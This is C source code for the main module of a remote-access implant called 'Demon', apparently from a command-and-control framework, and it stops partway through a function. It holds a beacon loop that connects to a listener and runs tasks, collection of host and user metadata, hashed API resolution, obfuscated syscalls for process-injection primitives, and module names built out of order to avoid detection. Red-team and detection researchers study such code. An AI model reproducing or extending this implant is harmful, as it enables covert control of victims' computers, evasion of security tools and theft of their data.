#include "Demon.h"

/* Import Common Headers */
#include <Common/Defines.h>
#include <Common/Macros.h>

/* Import Core Headers */
#include <Core/Transport.h>
#include <Core/SleepObf.h>
#include <Core/WinUtils.h>
#include <Core/MiniStd.h>

/* Import Inject Headers */
#include <Inject/Inject.h>

/* Import Inject Headers */
#include <Loader/ObjectApi.h>

/* Global Variables */
SEC_DATA INSTANCE Instance      = { 0 };
SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;

/*
 * In DemonMain it should go as followed:
 *
 * 1. Initialize pointer, modules and win32 api
 * 2. Initialize metadata
 * 3. Parse config
 * 4. Enter main connecting and tasking routine
 *
 * */
VOID DemonMain( PVOID ModuleInst )
{
    PUTS( "Start" )

    /* Use passed module agent instance */
    if ( ModuleInst )
        Instance.Session.ModuleBase = ModuleInst;

    /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
    DemonInit();

    /* Parse config */
    DemonConfig();

    /* Initialize MetaData */
    DemonMetaData( &Instance.MetaData, TRUE );

    /* Main demon routine */
    DemonRoutine();
}

/* Main demon routine:
 *
 * 1. Connect to listener
 * 2. Go into tasking routine:
 *      A. Sleep Obfuscation.
 *      B. Request for the task queue
 *      C. Parse Task
 *      D. Execute Task (if it's not DEMON_COMMAND_NO_JOB)
 *      E. Goto C (we do this til there is nothing left)
 *      F. Goto A (we have nothing else to execute then lets sleep and after waking up request for more)
 * 3. Sleep Obfuscation. After that lets try to connect to the listener again
 */
_Noreturn
VOID DemonRoutine()
{
    /* the main loop */
    for ( ;; )
    {
        /* if we aren't connected then lets connect to our host */
        if ( ! Instance.Session.Connected )
        {
            /* Connect to our listener */
            if ( TransportInit() )
            {

#ifdef TRANSPORT_HTTP
                /* reset the failure counter since we managed to connect to it. */
                Instance.Config.Transport.Host->Failures = 0;
#endif
            }
        }

        if ( Instance.Session.Connected )
        {
            /* Enter tasking routine */
            CommandDispatcher();
        }

        /* Sleep for a while (with encryption if specified) */
        SleepObf();
    }
}

/* Init metadata buffer/package. */
VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
{
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;
    DWORD            dwLength   = 0;

    /* Check we if we want to add the Agent Header + CommandID too */
    if ( Header )
    {
        *MetaData = PackageCreate( DEMON_INITIALIZE );

        /* Do not destroy this package if we fail to connect to the listener. */
        ( *MetaData )->Destroy = FALSE;
    }

    // create AES Keys/IV
    if ( Instance.Config.AES.Key == NULL && Instance.Config.AES.IV == NULL )
    {
        Instance.Config.AES.Key = Instance.Win32.LocalAlloc( LPTR, 32 );
        Instance.Config.AES.IV  = Instance.Win32.LocalAlloc( LPTR, 16 );

        for ( SHORT i = 0; i < 32; i++ )
            Instance.Config.AES.Key[ i ] = RandomNumber32();

        for ( SHORT i = 0; i < 16; i++ )
            Instance.Config.AES.IV[ i ]  = RandomNumber32();
    }

    /*

     Header (if specified):
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes

     MetaData:
        [ AES KEY      ] 32 bytes
        [ AES IV       ] 16 bytes
        [ Magic Value  ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ Host Name    ] size + bytes
        [ User Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
        [ SleepDelay   ] 4 bytes
        [ SleepJitter  ] 4 bytes
        [ Killdate     ] 8 bytes
        [ WorkingHours ] 4 bytes
        ..... more
        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
    */

    // Add AES Keys/IV
    PackageAddPad( *MetaData, ( PCHAR ) Instance.Config.AES.Key, 32 );
    PackageAddPad( *MetaData, ( PCHAR ) Instance.Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( *MetaData, Instance.Session.AgentID );

    // Get Computer name
    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &dwLength ) )
    {
        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &dwLength );
            PackageAddBytes( *MetaData, Data, dwLength );
            DATA_FREE( Data, dwLength );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Username
    dwLength = MAX_PATH;
    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
    {
        MemSet( Data, 0, dwLength );
        Instance.Win32.GetUserNameA( Data, &dwLength );
        PackageAddBytes( *MetaData, Data, dwLength );
        DATA_FREE( Data, dwLength );
    }
    else
        PackageAddInt32( *MetaData, 0 );


    // Get Domain
    Length = 0;
    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &dwLength ) )
    {
        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &dwLength );
            PackageAddBytes( *MetaData, Data, dwLength );
            DATA_FREE( Data, dwLength );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    Instance.Win32.GetAdaptersInfo( NULL, &dwLength );
    if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
    {
        if ( Instance.Win32.GetAdaptersInfo( Adapter, &dwLength ) == NO_ERROR )
        {
            PackageAddString( *MetaData, Adapter->IpAddressList.IpAddress.String );
            DATA_FREE( Adapter, dwLength );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Process Path
    Length = ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Length;
    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
    {
        Length = WCharStringToCharString(
                Data,
                ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer,
                Length
        );
        PackageAddBytes( *MetaData, Data, Length );
    } else PackageAddInt32( *MetaData, 0 );

    PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) Instance.Teb->ClientId.UniqueProcess );
    PackageAddInt32( *MetaData, Instance.Session.PPID );
    PackageAddInt32( *MetaData, Instance.Session.ProcessArch );
    PackageAddInt32( *MetaData, BeaconIsAdmin( ) );

    MemSet( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    Instance.Win32.RtlGetVersion( &OsVersions );
    PackageAddInt32( *MetaData, OsVersions.dwMajorVersion );
    PackageAddInt32( *MetaData, OsVersions.dwMinorVersion );
    PackageAddInt32( *MetaData, OsVersions.wProductType );
    PackageAddInt32( *MetaData, OsVersions.wServicePackMajor );
    PackageAddInt32( *MetaData, OsVersions.dwBuildNumber );

    PackageAddInt32( *MetaData, Instance.Session.OS_Arch );

    PackageAddInt32( *MetaData, Instance.Config.Sleeping );
    PackageAddInt32( *MetaData, Instance.Config.Jitter );
    PackageAddInt64( *MetaData, Instance.Config.Transport.KillDate );
    PackageAddInt32( *MetaData, Instance.Config.Transport.WorkingHours );
}

VOID DemonInit( VOID )
{
    // Variables
    CHAR                         ModuleName[ 20 ] = { 0 };
    OSVERSIONINFOEXW             OSVersionExW     = { 0 };
    SYSTEM_PROCESSOR_INFORMATION SystemInfo       = { 0 };

    MemSet( &Instance, 0, sizeof( INSTANCE ) );

    Instance.Teb = NtCurrentTeb();

#ifdef TRANSPORT_HTTP
    PUTS( "TRANSPORT_HTTP" )
#endif

#ifdef TRANSPORT_SMB
    PUTS( "TRANSPORT_SMB" )
#endif

    Instance.Modules.Kernel32 = LdrModulePeb( HASH_KERNEL32 );
    Instance.Modules.Ntdll    = LdrModulePeb( HASH_NTDLL );

    if ( ( ! Instance.Modules.Kernel32 ) || ( Instance.Modules.Ntdll ) )
    {
        // Ntdll
        Instance.Win32.LdrGetProcedureAddress              = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_LdrGetProcedureAddress );
        Instance.Win32.LdrLoadDll                          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_LdrLoadDll  );
        Instance.Win32.RtlAllocateHeap                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlAllocateHeap );
        Instance.Win32.RtlReAllocateHeap                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlReAllocateHeap );
        Instance.Win32.RtlFreeHeap                         = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlFreeHeap );
        Instance.Win32.RtlExitUserThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlExitUserThread );
        Instance.Win32.RtlExitUserProcess                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlExitUserProcess );
        Instance.Win32.RtlRandomEx                         = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlRandomEx );
        Instance.Win32.RtlNtStatusToDosError               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlNtStatusToDosError );
        Instance.Win32.RtlGetVersion                       = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlGetVersion );
        Instance.Win32.RtlCreateTimerQueue                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlCreateTimerQueue );
        Instance.Win32.RtlCreateTimer                      = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlCreateTimer );
        Instance.Win32.RtlDeleteTimerQueue                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlDeleteTimerQueue );
        Instance.Win32.RtlCaptureContext                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlCaptureContext );
        Instance.Win32.RtlAddVectoredExceptionHandler      = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlAddVectoredExceptionHandler );
        Instance.Win32.RtlRemoveVectoredExceptionHandler   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlRemoveVectoredExceptionHandler );
        Instance.Win32.NtClose                             = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtClose );
        Instance.Win32.NtCreateEvent                       = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtCreateEvent );
        Instance.Win32.NtSetEvent                          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSetEvent );

        // Kernel32
        Instance.Win32.VirtualProtectEx                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_VirtualProtectEx );
        Instance.Win32.VirtualProtect                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_VirtualProtect );
        Instance.Win32.LocalAlloc                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_LocalAlloc );
        Instance.Win32.LocalReAlloc                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_LocalReAlloc );
        Instance.Win32.LocalFree                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_LocalFree );
        Instance.Win32.CreateRemoteThread                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateRemoteThread );
        Instance.Win32.CreateToolhelp32Snapshot            = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateToolhelp32Snapshot );
        Instance.Win32.Process32FirstW                     = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Process32FirstW );
        Instance.Win32.Process32NextW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Process32NextW );
        Instance.Win32.CreatePipe                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreatePipe );
        Instance.Win32.CreateProcessA                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateProcessA );
        Instance.Win32.CreateProcessW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateProcessW );
        Instance.Win32.CreateFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateFileW );
        Instance.Win32.GetFullPathNameW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFullPathNameW );
        Instance.Win32.GetFileSize                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFileSize );
        Instance.Win32.CreateNamedPipeW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateNamedPipeW );
        Instance.Win32.ConvertFiberToThread                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ConvertFiberToThread );
        Instance.Win32.CreateFiberEx                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateFiberEx );
        Instance.Win32.ReadFile                            = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ReadFile );
        Instance.Win32.VirtualAllocEx                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_VirtualAllocEx );
        Instance.Win32.WaitForSingleObjectEx               = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_WaitForSingleObjectEx );
        Instance.Win32.ResumeThread                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ResumeThread );
        Instance.Win32.OpenThread                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_OpenThread );
        Instance.Win32.Thread32Next                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Thread32Next );
        Instance.Win32.Thread32First                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Thread32First );
        Instance.Win32.GetComputerNameExA                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetComputerNameExA );
        Instance.Win32.ExitProcess                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ExitProcess );
        Instance.Win32.GetExitCodeProcess                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetExitCodeProcess );
        Instance.Win32.GetExitCodeThread                   = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetExitCodeThread );
        Instance.Win32.TerminateProcess                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_TerminateProcess );
        Instance.Win32.GetTickCount                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetTickCount );
        Instance.Win32.ReadProcessMemory                   = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ReadProcessMemory );
        Instance.Win32.ConvertThreadToFiberEx              = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ConvertThreadToFiberEx );
        Instance.Win32.SwitchToFiber                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SwitchToFiber );
        Instance.Win32.DeleteFiber                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DeleteFiber );
        Instance.Win32.GetThreadContext                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetThreadContext );
        Instance.Win32.SetThreadContext                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SetThreadContext );
        Instance.Win32.AllocConsole                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_AllocConsole );
        Instance.Win32.FreeConsole                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FreeConsole );
        Instance.Win32.GetConsoleWindow                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetConsoleWindow );
        Instance.Win32.GetStdHandle                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetStdHandle );
        Instance.Win32.SetStdHandle                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SetStdHandle );
        Instance.Win32.WaitNamedPipeW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_WaitNamedPipeW  );
        Instance.Win32.PeekNamedPipe                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_PeekNamedPipe );
        Instance.Win32.DisconnectNamedPipe                 = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DisconnectNamedPipe );
        Instance.Win32.WriteFile                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_WriteFile );
        Instance.Win32.ConnectNamedPipe                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ConnectNamedPipe );
        Instance.Win32.FreeLibrary                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FreeLibrary );
        Instance.Win32.GetCurrentDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetCurrentDirectoryW );
        Instance.Win32.GetFileAttributesW                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFileAttributesW );
        Instance.Win32.FindFirstFileW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FindFirstFileW );
        Instance.Win32.FindNextFileW                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FindNextFileW );
        Instance.Win32.FindClose                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FindClose );
        Instance.Win32.FileTimeToSystemTime                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FileTimeToSystemTime );
        Instance.Win32.SystemTimeToTzSpecificLocalTime     = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SystemTimeToTzSpecificLocalTime );
        Instance.Win32.RemoveDirectoryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_RemoveDirectoryW );
        Instance.Win32.DeleteFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DeleteFileW );
        Instance.Win32.CreateDirectoryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateDirectoryW );
        Instance.Win32.CopyFileW                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CopyFileW );
        Instance.Win32.InitializeProcThreadAttributeList   = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_InitializeProcThreadAttributeList );
        Instance.Win32.UpdateProcThreadAttribute           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_UpdateProcThreadAttribute  );
        Instance.Win32.SetCurrentDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SetCurrentDirectoryW );
        Instance.Win32.Wow64DisableWow64FsRedirection      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Wow64DisableWow64FsRedirection );
        Instance.Win32.Wow64RevertWow64FsRedirection       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Wow64RevertWow64FsRedirection );
        Instance.Win32.GetModuleHandleA                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetModuleHandleA );
        Instance.Win32.GetSystemTimeAsFileTime             = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetSystemTimeAsFileTime );
        Instance.Win32.GetLocalTime                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetLocalTime );
        Instance.Win32.DuplicateHandle                     = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DuplicateHandle );

    }

    // Check if it's min win xp. no one uses win 95 and below (from Meterpreter)
    Instance.Win32.RtlGetVersion( &OSVersionExW );
    if ( OSVersionExW.dwMajorVersion >= 5 )
    {
        Instance.Session.OSVersion = WIN_VERSION_UNKNOWN;

        if ( OSVersionExW.dwMajorVersion == 5 )
        {
            if ( OSVersionExW.dwMinorVersion == 1 )
                Instance.Session.OSVersion = WIN_VERSION_XP;
        }
        else if ( OSVersionExW.dwMajorVersion == 6 )
        {
            if ( OSVersionExW.dwMinorVersion == 0 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_VISTA : WIN_VERSION_2008;
            else if ( OSVersionExW.dwMinorVersion == 1 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_7 : WIN_VERSION_2008_R2;
            else if ( OSVersionExW.dwMinorVersion == 2 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8 : WIN_VERSION_2012;
            else if ( OSVersionExW.dwMinorVersion == 3 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8_1 : WIN_VERSION_2012_R2;
        }
        else if ( OSVersionExW.dwMajorVersion == 10 )
        {
            if ( OSVersionExW.dwMinorVersion == 0 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
        }
    }
    PRINTF( "OSVersion: %d\n", Instance.Session.OSVersion );

#ifdef OBF_SYSCALL
    if ( Instance.Session.OSVersion > WIN_VERSION_10 )
    {
        PUTS( "Obfuscated Syscall" );
        SyscallsInit();

        PSYSCALL_STUB   Syscalls        = Instance.Win32.LocalAlloc( LPTR, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
        HMODULE         pNtdll          = SyscallLdrNtdll();
        DWORD           SyscallCounter  = SyscallsExtract( pNtdll, Syscalls );

        Instance.Syscall.NtOpenProcess                     = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtOpenProcess );
        Instance.Syscall.NtQueryInformationProcess         = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryInformationProcess );
        Instance.Syscall.NtQuerySystemInformation          = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQuerySystemInformation );
        Instance.Syscall.NtAllocateVirtualMemory           = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtAllocateVirtualMemory );
        Instance.Syscall.NtQueueApcThread                  = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueueApcThread );
        Instance.Syscall.NtOpenThread                      = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtOpenThread );
        Instance.Syscall.NtResumeThread                    = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtResumeThread );
        Instance.Syscall.NtSuspendThread                   = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtSuspendThread );
        Instance.Syscall.NtCreateEvent                     = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtCreateEvent );
        Instance.Syscall.NtDuplicateObject                 = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtDuplicateObject );
        Instance.Syscall.NtGetContextThread                = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtGetContextThread );
        Instance.Syscall.NtSetContextThread                = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtSetContextThread );
        Instance.Syscall.NtWaitForSingleObject             = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtWaitForSingleObject );
        Instance.Syscall.NtAlertResumeThread               = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtAlertResumeThread );
        Instance.Syscall.NtSignalAndWaitForSingleObject    = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtSignalAndWaitForSingleObject );
        Instance.Syscall.NtTestAlert                       = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtTestAlert );
        Instance.Syscall.NtCreateThreadEx                  = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtCreateThreadEx );
        Instance.Syscall.NtOpenProcessToken                = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtOpenProcessToken );
        Instance.Syscall.NtDuplicateToken                  = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtDuplicateToken );
        Instance.Syscall.NtProtectVirtualMemory            = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtProtectVirtualMemory  );
        Instance.Syscall.NtTerminateThread                 = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtTerminateThread );
        Instance.Syscall.NtWriteVirtualMemory              = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtWriteVirtualMemory );
        Instance.Syscall.NtContinue                        = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtContinue );
        Instance.Syscall.NtReadVirtualMemory               = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtReadVirtualMemory );
        Instance.Syscall.NtFreeVirtualMemory               = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtFreeVirtualMemory );
        Instance.Syscall.NtQueryVirtualMemory              = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryVirtualMemory );
        Instance.Syscall.NtQueryInformationToken           = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryInformationToken );
        Instance.Syscall.NtQueryObject                     = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryObject );

        MemSet( Syscalls, 0, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
        Instance.Win32.LocalFree( Syscalls );
        Syscalls = NULL;

        // Restore ntdll from PEB
        Instance.Modules.Ntdll                             = LdrModulePeb( HASH_NTDLL );
        PUTS( "END OF OBFUSCATED" )
    }
    else
#endif
    {
        PUTS( "Using Native functions..." )
        Instance.Syscall.NtOpenProcess                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtOpenProcess );
        Instance.Syscall.NtQueryInformationProcess         = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationProcess );
        Instance.Syscall.NtQuerySystemInformation          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQuerySystemInformation );
        Instance.Syscall.NtAllocateVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtAllocateVirtualMemory );
        Instance.Syscall.NtQueueApcThread                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueueApcThread );
        Instance.Syscall.NtOpenThread                      = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtOpenThread );
        Instance.Syscall.NtResumeThread                    = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtResumeThread );
        Instance.Syscall.NtSuspendThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSuspendThread );
        Instance.Syscall.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtCreateEvent );
        Instance.Syscall.NtDuplicateObject                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtDuplicateObject );
        Instance.Syscall.NtGetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtGetContextThread );
        Instance.Syscall.NtSetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSetContextThread );
        Instance.Syscall.NtWaitForSingleObject             = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtWaitForSingleObject );
        Instance.Syscall.NtAlertResumeThread               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtAlertResumeThread );
        Instance.Syscall.NtSignalAndWaitForSingleObject    = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSignalAndWaitForSingleObject );
        Instance.Syscall.NtTestAlert                       = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtTestAlert );
        Instance.Syscall.NtCreateThreadEx                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtCreateThreadEx );
        Instance.Syscall.NtOpenProcessToken                = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtOpenProcessToken );
        Instance.Syscall.NtDuplicateToken                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtDuplicateToken );
        Instance.Syscall.NtProtectVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtProtectVirtualMemory  );
        Instance.Syscall.NtTerminateThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtTerminateThread );
        Instance.Syscall.NtWriteVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtWriteVirtualMemory );
        Instance.Syscall.NtContinue                        = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtContinue );
        Instance.Syscall.NtReadVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtReadVirtualMemory );
        Instance.Syscall.NtFreeVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtFreeVirtualMemory );
        Instance.Syscall.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryVirtualMemory );
        Instance.Syscall.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationToken );
        Instance.Syscall.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationThread );
        Instance.Syscall.NtQueryObject                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryObject );
    }

    ModuleName[ 0 ] = 'A';
    ModuleName[ 2 ] = 'V';
    ModuleName[ 3 ] = 'A';
    ModuleName[ 1 ] = 'D';
    ModuleName[ 8 ] = 0;
    ModuleName[ 6 ] = '3';
    ModuleName[ 7 ] = '2';
    ModuleName[ 5 ] = 'I';
    ModuleName[ 4 ] = 'P';
    Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'C';
    ModuleName[ 3 ] = 'P';
    ModuleName[ 5 ] = '3';
    ModuleName[ 7 ] = 0;
    ModuleName[ 2 ] = 'Y';
    ModuleName[ 4 ] = 'T';
    ModuleName[ 1 ] = 'R';
    ModuleName[ 6 ] = '2';
    Instance.Modules.Crypt32  = LdrModuleLoad( ModuleName );

    ModuleName[ 1 ] = 'S';
    ModuleName[ 2 ] = 'C';
    ModuleName[ 0 ] = 'M';
    ModuleName[ 7 ] = 0;
